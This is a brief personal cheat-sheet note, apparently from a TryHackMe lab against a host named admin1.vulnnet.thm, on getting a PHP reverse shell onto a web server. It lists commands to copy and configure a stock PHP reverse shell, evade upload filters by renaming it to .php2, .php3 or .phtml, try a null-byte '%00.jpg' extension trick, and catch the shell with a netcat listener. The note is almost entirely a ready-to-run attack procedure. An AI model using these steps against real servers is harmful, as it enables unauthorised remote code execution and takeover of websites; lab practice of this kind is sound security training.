PHP Upload file
```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
ip a
vim php-reverse-shell.php
```
change IP and Port:443

If upload file not allowed:
```bash
mv php-reverse-shell.php rev.php2
```
Try to open the file:
http://admin1.vulnnet.thm/fileadmin/user_upload/rev.php2
or right click open in new tab!
! if open as text instead of run it try:
```bash
mv rev.php2 rev.php3
mv rev.php2 rev.phtml
```
If still not allowed try to rename the file from the host!
Still not work?
Try '0 byte' attack
```bash
mv rev.php rev.php%00.jpg
```
[[netcat]]
```bash
nc -nlvp 4444
```
